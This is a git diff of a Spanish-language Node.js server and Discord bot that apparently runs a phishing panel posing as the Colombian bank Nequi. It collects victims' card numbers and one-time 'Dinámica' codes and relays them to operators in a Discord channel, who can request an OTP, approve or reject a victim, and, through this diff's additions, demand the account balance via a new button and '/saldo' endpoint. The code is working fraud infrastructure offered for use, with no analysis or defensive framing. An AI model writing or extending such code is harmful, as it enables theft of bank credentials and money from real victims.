@@ -9,11 +9,17 @@ app.use(express.json());
 
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const DISCORD_CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 8080;
 
 const sesiones = new Map();
 
-const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+const client = new Client({ 
+    intents: [GatewayIntentBits.Guilds],
+    presence: {
+        status: 'online',
+        activities: [{ name: 'Nequi', type: 0 }]
+    }
+});
 
 client.once('ready', () => {
     console.log(`✅ Bot conectado como ${client.user.tag}`);
@@ -29,7 +35,7 @@ app.post('/nuevo', async (req, res) => {
 
         sesiones.set(userId, {
             userId, tarjeta, codigo: codigo || '', monto: monto || '0',
-            estado: 'pending', otp: null, discordMsgId: null
+            estado: 'pending', otp: null, saldo: null, discordMsgId: null
         });
 
         const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);
@@ -44,8 +50,10 @@ app.post('/nuevo', async (req, res) => {
             )
             .setTimestamp();
 
+        // 🔥 AQUÍ AGREGAMOS EL NUEVO BOTÓN DE SALDO
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setCustomId(`otp_${userId}`).setLabel('📱 Pedir Dinámica').setStyle(ButtonStyle.Primary),
+            new ButtonBuilder().setCustomId(`saldo_${userId}`).setLabel('💰 Pedir Saldo').setStyle(ButtonStyle.Primary),
             new ButtonBuilder().setCustomId(`approve_${userId}`).setLabel('✅ Aprobar').setStyle(ButtonStyle.Success),
             new ButtonBuilder().setCustomId(`reject_${userId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger)
         );
@@ -89,14 +97,41 @@ app.post('/otp/:userId', async (req, res) => {
     }
 });
 
-// 3. Endpoint que consulta espera.html cada 2 segundos
+// 🔥 3. NUEVO Endpoint que recibe el saldo del usuario
+app.post('/saldo/:userId', async (req, res) => {
+    try {
+        const { userId } = req.params;
+        const { saldo } = req.body;
+        const s = sesiones.get(userId);
+        if (!s) return res.status(404).json({ ok: false });
+
+        s.saldo = saldo;
+        s.estado = 'saldo_received';
+        sesiones.set(userId, s);
+
+        if (s.discordMsgId) {
+            const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);
+            const msg = await channel.messages.fetch(s.discordMsgId);
+            const embed = EmbedBuilder.from(msg.embeds[0]).addFields(
+                { name: '💰 Saldo declarado', value: `\`${saldo}\``, inline: false }
+            );
+            await msg.edit({ embeds: [embed] });
+        }
+        res.json({ ok: true });
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ ok: false });
+    }
+});
+
+// 4. Endpoint que consulta espera.html cada 2 segundos
 app.get('/estado/:userId', (req, res) => {
     const s = sesiones.get(req.params.userId);
     if (!s) return res.json({ estado: 'pending' });
     res.json({ estado: s.estado, otp: s.otp || null });
 });
 
-// 4. Escuchar los clics de los botones en Discord
+// 5. Escuchar los clics de los botones en Discord
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton()) return;
     const [action, userId] = interaction.customId.split('_');
@@ -108,6 +143,10 @@ client.on('interactionCreate', async (interaction) => {
         s.estado = 'otp';
         sesiones.set(userId, s);
         await interaction.reply({ content: `📱 Dinámica solicitada al usuario.`, ephemeral: true });
+    } else if (action === 'saldo') {
+        s.estado = 'pedir_saldo';
+        sesiones.set(userId, s);
+        await interaction.reply({ content: `💰 Saldo solicitado al usuario.`, ephemeral: true });
     } else if (action === 'approve') {
         s.estado = 'approved';
         sesiones.set(userId, s);
@@ -119,4 +158,4 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-app.listen(PORT, () => console.log(`🚀 Servidor HTTP en puerto ${PORT}`));
+app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Servidor HTTP en puerto ${PORT}`));
